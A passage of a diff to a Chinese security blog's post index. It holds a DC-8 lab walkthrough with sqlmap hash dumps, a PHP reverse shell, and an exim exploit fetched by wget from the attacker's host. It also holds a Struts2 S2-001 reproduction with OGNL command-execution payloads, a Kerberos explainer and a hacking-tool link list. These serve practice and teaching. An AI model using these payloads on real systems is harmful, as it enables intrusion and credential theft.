taxonomy_term_data          |<br>| taxonomy_term_hierarchy     |<br>| taxonomy_vocabulary         |<br>| url_alias                   |<br>| users                       |<br>| users_roles                 |<br>| variable                    |<br>| views_display               |<br>| views_view                  |<br>| watchdog                    |<br>| webform                     |<br>| webform_component           |<br>| webform_conditional         |<br>| webform_conditional_actions |<br>| webform_conditional_rules   |<br>| webform_emails              |<br>| webform_last_download       |<br>| webform_roles               |<br>| webform_submissions         |<br>| webform_submitted_data      |<br>+—————————–+</p>
+</blockquote>
+<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users --columns</code></p>
+<blockquote>
+<p> Database: d7db<br>Table: users<br>[16 columns]<br>+——————+——————+<br>| Column           | Type             |<br>+——————+——————+<br>| language         | varchar(12)      |<br>| access           | int(11)          |<br>| created          | int(11)          |<br>| data             | longblob         |<br>| init             | varchar(254)     |<br>| login            | int(11)          |<br>| mail             | varchar(254)     |<br>| name             | varchar(60)      |<br>| pass             | varchar(128)     |<br>| picture          | int(11)          |<br>| signature        | varchar(255)     |<br>| signature_format | varchar(255)     |<br>| status           | tinyint(4)       |<br>| theme            | varchar(255)     |<br>| timezone         | varchar(32)      |<br>| uid              | int(10) unsigned |</p>
+</blockquote>
+<br>
+
+<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users -C name,pass -dump</code></p>
+<blockquote>
+<p>Database: d7db<br>Table: users<br>[2 entries]<br>+——-+———————————————————+<br>| name  | pass                                                    |<br>+——-+———————————————————+<br>| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |<br>| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |<br>+——-+———————————————————+</p>
+</blockquote>
+<p>跑出来两条数据 ，但是密码是加密的，根据john用户名提示，使用<code>john</code>解密</p>
+<br>
+
+<p><code>admin</code> 使用john没跑出来</p>
+<p><code>john</code> 密码为<code>turtle</code></p>
+<p><code>http://192.168.18.141/user/</code>登录成功</p>
+<p>打开content看看</p>
+<p><img src="/posts/437699f/content.png"></p>
+<br>
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>contact us页面可以编辑</p>
+<p>修改成php格式</p>
+<p><img src="/posts/437699f/ncshell.png"></p>
+<p><img src="/posts/437699f/submit.png"></p>
+<p>反弹交互shell</p>
+<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p><img src="/posts/437699f/python_shell.png"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>  查看具有root权限的命令</p>
+<p><img src="/posts/437699f/find.png"></p>
+<p>试着利用下exim4</p>
+<p>查看exim4版本</p>
+<p><code>exim4 --version</code></p>
+<blockquote>
+<p>Exim version 4.89 </p>
+</blockquote>
+<p><code>searchsploit  exim 4</code></p>
+<p>找下exp，选择46996.sh,拷贝到本地，并开启kali的http服务</p>
+<blockquote>
+<p>cp /usr/share/exploitdb/exploits/linux/local/46996.sh dc8.sh</p>
+<p>python2 -m SimpleHTTPServer</p>
+</blockquote>
+<p>在靶机上下载kali的shell,先回到/tmp 目录下</p>
+<blockquote>
+<p>wget <a href="http://192.168.18.131:8000/dc8.sh">http://192.168.18.131:8000/dc8.sh</a></p>
+</blockquote>
+<p>注意:直接把exp下载过去是无法使用的，<code>sed -i -e &#39;s/\r$//&#39; dc8.sh</code></p>
+<blockquote>
+<p>www-data@dc-8:/tmp$ ls<br>ls<br>getShell.sh<br>www-data@dc-8:/tmp$ chmod 777 dc8.sh<br>chmod 777 dc8.sh<br>www-data@dc-8:/tmp$ ./dc8.sh</p>
+</blockquote>
+<p>看下提示用法</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Usage (setuid method):</span><br><span class="line"></span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m setuid</span><br><span class="line"># Preparing setuid shell helper...</span><br><span class="line"># Delivering setuid payload...</span><br><span class="line"># [...]</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 &#x2F;tmp&#x2F;pwned</span><br><span class="line"># # id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"># Usage (netcat method):</span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m netcat</span><br><span class="line"># Delivering netcat payload...</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"># id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/437699f/flag.png"></p>
+<br>
+
+<br>
+
+<blockquote>
+<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://www.freebuf.com/articles/web/261074.html">https://www.freebuf.com/articles/web/261074.html</a></p>
+<p><a href="https://my.oschina.net/u/3896378/blog/4427624">https://my.oschina.net/u/3896378/blog/4427624</a></p>
 </blockquote>
 ]]></content>
       <categories>
@@ -1345,24 +1345,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hacker_Tools-转</title>
-    <url>/posts/ec585c99/</url>
-    <content><![CDATA[<h1 id="Hacker-Tools"><a href="#Hacker-Tools" class="headerlink" title="Hacker_Tools"></a>Hacker_Tools</h1><p>来源：<a href="https://github.com/deliciousYSH/Hacker_Tools">https://github.com/deliciousYSH/Hacker_Tools</a></p>
-<h1 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h1><p>Nmap端口扫描器：<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>被动式注入检测工具： <a href="https://github.com/sea-god/GourdScan">https://github.com/sea-god/GourdScan</a><br>高质量扫描Linux / FreeBSD Server中的任何漏洞：<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>子域名扫描器：<br>Altdns-通过变更和排列发现子域：<a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>SubBrute使用开放式解析器作为一种代理来规避DNS速率限制：<a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br>subDomainsBrute 1.2一个针对渗透测试者的快速子域暴力工具：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>本地网络扫描器（打开网页时扫描本地网络的PoC Javascript）：<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>HellRaiser基于端口扫描以及关联CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>Routeh-页面上的漏洞路由器：<br><a href="https://github.com/jh00nbr/Routeh">https://github.com/jh00nbr/Routeh</a><br>防火墙检测工具：<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>漏洞扫描程序，以最少的规则集在短时间内扫描大量目标：<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>基于SQLMAP的主动和被动SQL注入的漏洞扫描工具： <a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a></p>
-<h1 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h1><p>社工收集工具：<br><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>信息扫描工具：<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>本地网络扫描仪：<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>通过RDP扫描可访问性工具后门：<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>网络基础设施渗透测试工具：<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>GitHub信息收集：<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p>
-<h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><p>密码破解工具（开膛手Johnny）:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>获取存储在本地计算机上大量的密码：<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a><br>SNMP暴力破解：<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
-<h1 id="Web渗透（禁止用作违法）"><a href="#Web渗透（禁止用作违法）" class="headerlink" title="Web渗透（禁止用作违法）"></a>Web渗透（禁止用作违法）</h1><p>HTTP暴力破解，撞库攻击脚本：<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>webshell：<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>免杀webshell无限生成工具：<br><a href="https://github.com/yzddmr6/webshell-venom">https://github.com/yzddmr6/webshell-venom</a><br>渗透工具合集：<br><a href="https://github.com/rootphantomer/hack_tools_for_me">https://github.com/rootphantomer/hack_tools_for_me</a><br>XSSOR-方便XSS与CSRF的工具：<br><a href="https://github.com/evilcos/xssor2">https://github.com/evilcos/xssor2</a><br>w3af-Web应用程序攻击和审核框架：<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>渗透测试包：<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>网络路径扫描仪：<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>代码注入检测工具： <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> hackUtils：<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>Nikto Web服务器扫描仪：<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>自动化的多合一OS命令注入和利用工具：<br><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a><br>sslscan测试：<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>Windows安全工具套件：<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>Apache实时日志分析器系统：<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>检测网络入侵的特征，恶意蜘蛛（Malspider）：<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>下一代网络扫描仪WhatWeb：<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>WPScan，WordPress漏洞扫描程序：<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>【sqlmap】:<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>SQLi-Hunter(HTTP代理服务器和一个SQLMAP API包装器):<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>中国菜刀：<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
-<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Web应用程序模糊器：<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
-<h1 id="漏洞及渗透练习平台"><a href="#漏洞及渗透练习平台" class="headerlink" title="漏洞及渗透练习平台"></a>漏洞及渗透练习平台</h1><p>WebGoat漏洞练习平台：<br><a href="https://webgoat.github.io/WebGoat/">https://webgoat.github.io/WebGoat/</a><br>dvwa漏洞练习平台：<br><a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a><br>数据库注入练习平台 ：<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>like OWASP Node Goat：<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Ruby编写的一款工具，安全方案生成器（SecGen）：<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a><br>VulApps漏洞练习平台：<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>ZVuldrill Web突破演练平台：<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>WebGoat旧版：<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p>
-]]></content>
-      <categories>
-        <category>工具手册</category>
-      </categories>
-      <tags>
-        <tag>工具手册</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hashcat使用</title>
     <url>/posts/de6bd435/</url>
     <content><![CDATA[<p>Hashcat –help 参看hashcat 帮助文档 </p>
@@ -1495,47 +1477,102 @@
       </tags>
   </entry>
   <entry>
-    <title>Struts2复现s2-001</title>
-    <url>/posts/996ea1fe/</url>
-    <content><![CDATA[<h3 id="S2-001复现"><a href="#S2-001复现" class="headerlink" title="S2-001复现"></a>S2-001复现</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>用户提交表单数据验证失败后，后端会使用OGNL表达式%{value}对输入的参数进行解析,从而造成命令执行</p>
-<h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><p><code>cd s2-001</code></p>
-<p><code>docker-compose build</code></p>
-<p><code>docker-compose up -d</code></p>
-<p><code>docekr ps</code>查看是否启动成功</p>
-<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>访问192.168.159.128:8080</p>
-<p><img src="/posts/996ea1fe/001-1.PNG"></p>
-<p>输入<code>%&#123;1+23&#125;</code>得到结果为24 可以判断存在远程代码执行</p>
-<p><img src="/posts/996ea1fe/001-2.PNG"></p>
-<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p><code>%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></p>
-<p>将<code>pwd</code>换成对应命令即可执行</p>
-<br>
+    <title>Kerberos协议分析</title>
+    <url>/posts/e9f6bf8b/</url>
+    <content><![CDATA[<h3 id="参与角色"><a href="#参与角色" class="headerlink" title="参与角色"></a>参与角色</h3><ul>
+<li>Client</li>
+<li>Server</li>
+<li>KDC<ul>
+<li>AD：存储所有Client的白名单，用于验证Client身份</li>
+<li>AS：为Client生成TGT 服务</li>
+<li>TGS：为Client生成某个服务的Ticket</li>
+</ul>
+</li>
+</ul>
+<h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><p>AS：身份认证服务，用于验证Client身份</p>
+<p>KDC：密钥分发中心</p>
+<p>TGT：票据中心，访问TGS的票据</p>
+<p>TGS：票据授权服务</p>
+<p>ST：访问Server的票据</p>
+<p>SessionKey：临时会话密钥a，AS生成发送给客户端(随机密钥)</p>
+<p>ServerSessionKey：临时会话密钥b，TGS生成发送给客户端(随机密钥)</p>
+<h3 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h3><h4 id="Client-向KDC-AS申请TGT"><a href="#Client-向KDC-AS申请TGT" class="headerlink" title="Client 向KDC-AS申请TGT"></a>Client 向KDC-AS申请TGT</h4><h5 id="Client-gt-KDC-AS-AS-REQ"><a href="#Client-gt-KDC-AS-AS-REQ" class="headerlink" title="Client -&gt; KDC-AS (AS_REQ)"></a>Client -&gt; KDC-AS (AS_REQ)</h5><p>发送AS_REQ：(被Client加密的时间戳, 客户端信息, 服务器端信息)</p>
+<p>KDC-AS进行认证 看是否在白名单中</p>
+<h5 id="KDC-AS-gt-Client-AS-REP"><a href="#KDC-AS-gt-Client-AS-REP" class="headerlink" title="KDC-AS -&gt; Client(AS_REP)"></a>KDC-AS -&gt; Client(AS_REP)</h5><p>如果认证通过，AS会随机生成一个字符串 <strong>Sessionkey</strong></p>
+<p>发送两条消息</p>
+<p>T(C)   Client Pass Hash(SessionKey)  ,用于后续与TGS服务通信</p>
+<pre><code>发送 SessionKey 
+</code></pre>
+<p>TGT   KDC Pass Hash(SessionKey, Client信息) ，作为向TGS申请票据的凭证</p>
+<pre><code>发送 SessionKey Client信息 结束时间
+</code></pre>
+<h4 id="Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket"><a href="#Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket" class="headerlink" title="Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket"></a>Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket</h4><h5 id="Client-gt-KDC-TGS-TGS-REQ"><a href="#Client-gt-KDC-TGS-TGS-REQ" class="headerlink" title="Client -&gt; KDC-TGS (TGS_REQ)"></a>Client -&gt; KDC-TGS (TGS_REQ)</h5><p>客户端使用NTLM Hash解密T(C) 得到<strong>SessionKey</strong></p>
+<p>Client 向 TGS 发送消息</p>
+<pre><code>TGT
 
-<p>获取web路径POC</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#req&#x3D;@org.apache.struts2.ServletActionContext@getRequest(),</span><br><span class="line"></span><br><span class="line">#response&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line"></span><br><span class="line">#response.println(#req.getRealPath(&#39;&#x2F;&#39;)),</span><br><span class="line"></span><br><span class="line">#response.flush(),</span><br><span class="line"></span><br><span class="line">#response.close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+SessionKey(Client信息,时间戳) 可以记作认证因子，使用SessionKey进行加密
 
-<p><img src="/posts/996ea1fe/001-3.PNG"></p>
-<p>查看权限whoami POC</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line"></span><br><span class="line">#b&#x3D;#a.getInputStream(),</span><br><span class="line"></span><br><span class="line">#c&#x3D;new java.io.InputStreamReader(#b),</span><br><span class="line"></span><br><span class="line">#d&#x3D;new java.io.BufferedReader(#c),</span><br><span class="line"></span><br><span class="line">#e&#x3D;new char[50000],</span><br><span class="line"></span><br><span class="line">#d.read(#e),</span><br><span class="line"></span><br><span class="line">#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line"></span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line"></span><br><span class="line">#f.getWriter().flush(),#f.getWriter().close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+Client信息
 
-<p><img src="/posts/996ea1fe/001-4.PNG"></p>
-<p><code>cat /etc/passwd</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;&#x2F;etc&#x2F;passwd&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line"></span><br><span class="line">#b&#x3D;#a.getInputStream(),</span><br><span class="line"></span><br><span class="line">#c&#x3D;new java.io.InputStreamReader(#b),</span><br><span class="line"></span><br><span class="line">#d&#x3D;new java.io.BufferedReader(#c),</span><br><span class="line"></span><br><span class="line">#e&#x3D;new char[50000],#d.read(#e),</span><br><span class="line"></span><br><span class="line">#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line"></span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line"></span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line"></span><br><span class="line">#f.getWriter().close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+Server信息
+</code></pre>
+<h5 id="KDC-TGS-gt-Client-TGS-REP"><a href="#KDC-TGS-gt-Client-TGS-REP" class="headerlink" title="KDC-TGS -&gt; Client(TGS_REP)"></a>KDC-TGS -&gt; Client(TGS_REP)</h5><p>KDC使用NTLMHash解密 TGT 得到 (SessionKey，Client信息，结束时间)</p>
+<p>然后使用SessionKey解密 认证因子 得到(Client信息，时间戳)</p>
+<p>校验 时间戳与当前时间 和解密TGT后的Client信息与SessionKey解密后的Client信息</p>
+<p>校验通过后，会判断客户端有没有权限访问服务端    </p>
+<p>认证通过后，KDC 会生成ServerSessionKey(随机生成)</p>
+<p>发送RGS_REP:</p>
+<p>SessionKey(ServerSessionKey, Client信息，票据到期时间)  （使用SessionKey加密的ServerSessionKey ）</p>
+<p>ST (ServerSessionKey, 客户信息 ，票据到期时间)  </p>
+<p>票据到期时间可以理解成TGS生命周期</p>
+<h4 id="Client得到ST后，可以访问server"><a href="#Client得到ST后，可以访问server" class="headerlink" title="Client得到ST后，可以访问server"></a>Client得到ST后，可以访问server</h4><p>Client 收到信息后，使⽤Session Key解密获得 (ServerSessionKey, Client信息，TGS生命周期）</p>
+<h5 id="Client-gt-Server-AP-REQ"><a href="#Client-gt-Server-AP-REQ" class="headerlink" title="Client -&gt; Server (AP-REQ)"></a>Client -&gt; Server (AP-REQ)</h5><p>发送AP-REQ:</p>
+<pre><code>ST
 
-<p><img src="/posts/996ea1fe/001-5.PNG"></p>
-<h4 id="关闭环境"><a href="#关闭环境" class="headerlink" title="关闭环境"></a>关闭环境</h4><p><code>docker-compose down -v</code></p>
-<br>
-
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
-<p> <a href="https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/">https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/</a></p>
-<p><a href="https://xz.aliyun.com/t/2672#toc-0">https://xz.aliyun.com/t/2672#toc-0</a></p>
-<p><a href="https://www.freebuf.com/vuls/246768.html">https://www.freebuf.com/vuls/246768.html</a></p>
-</blockquote>
+ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用ServerSessionKey加密
+</code></pre>
+<h5 id="Server-gt-Client-AP-REP"><a href="#Server-gt-Client-AP-REP" class="headerlink" title="Server -&gt; Client(AP-REP)"></a>Server -&gt; Client(AP-REP)</h5><p>Server使用NTLM Hash解密ST 得到 (ServerSessionKey,  Client信息，票据到期时间)</p>
+<p>用ServerSessionKey解密认证因子2 得到 (Client信息，票据到期时间)</p>
+<p>然后再校验时间戳和Client信息</p>
+<p>校验通过后，客户端即可访问服务端</p>
 ]]></content>
       <categories>
-        <category>Struts2</category>
+        <category>内网渗透</category>
       </categories>
       <tags>
-        <tag>Struts2</tag>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hacker_Tools-转</title>
+    <url>/posts/ec585c99/</url>
+    <content><![CDATA[<h1 id="Hacker-Tools"><a href="#Hacker-Tools" class="headerlink" title="Hacker_Tools"></a>Hacker_Tools</h1><p>来源：<a href="https://github.com/deliciousYSH/Hacker_Tools">https://github.com/deliciousYSH/Hacker_Tools</a></p>
+<h1 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h1><p>Nmap端口扫描器：<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>被动式注入检测工具： <a href="https://github.com/sea-god/GourdScan">https://github.com/sea-god/GourdScan</a><br>高质量扫描Linux / FreeBSD Server中的任何漏洞：<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>子域名扫描器：<br>Altdns-通过变更和排列发现子域：<a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>SubBrute使用开放式解析器作为一种代理来规避DNS速率限制：<a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br>subDomainsBrute 1.2一个针对渗透测试者的快速子域暴力工具：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>本地网络扫描器（打开网页时扫描本地网络的PoC Javascript）：<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>HellRaiser基于端口扫描以及关联CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>Routeh-页面上的漏洞路由器：<br><a href="https://github.com/jh00nbr/Routeh">https://github.com/jh00nbr/Routeh</a><br>防火墙检测工具：<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>漏洞扫描程序，以最少的规则集在短时间内扫描大量目标：<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>基于SQLMAP的主动和被动SQL注入的漏洞扫描工具： <a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a></p>
+<h1 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h1><p>社工收集工具：<br><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>信息扫描工具：<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>本地网络扫描仪：<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>通过RDP扫描可访问性工具后门：<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>网络基础设施渗透测试工具：<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>GitHub信息收集：<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p>
+<h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><p>密码破解工具（开膛手Johnny）:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>获取存储在本地计算机上大量的密码：<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a><br>SNMP暴力破解：<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
+<h1 id="Web渗透（禁止用作违法）"><a href="#Web渗透（禁止用作违法）" class="headerlink" title="Web渗透（禁止用作违法）"></a>Web渗透（禁止用作违法）</h1><p>HTTP暴力破解，撞库攻击脚本：<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>webshell：<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>免杀webshell无限生成工具：<br><a href="https://github.com/yzddmr6/webshell-venom">https://github.com/yzddmr6/webshell-venom</a><br>渗透工具合集：<br><a href="https://github.com/rootphantomer/hack_tools_for_me">https://github.com/rootphantomer/hack_tools_for_me</a><br>XSSOR-方便XSS与CSRF的工具：<br><a href="https://github.com/evilcos/xssor2">https://github.com/evilcos/xssor2</a><br>w3af-Web应用程序攻击和审核框架：<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>渗透测试包：<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>网络路径扫描仪：<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>代码注入检测工具： <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> hackUtils：<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>Nikto Web服务器扫描仪：<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>自动化的多合一OS命令注入和利用工具：<br><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a><br>sslscan测试：<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>Windows安全工具套件：<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>Apache实时日志分析器系统：<br><a 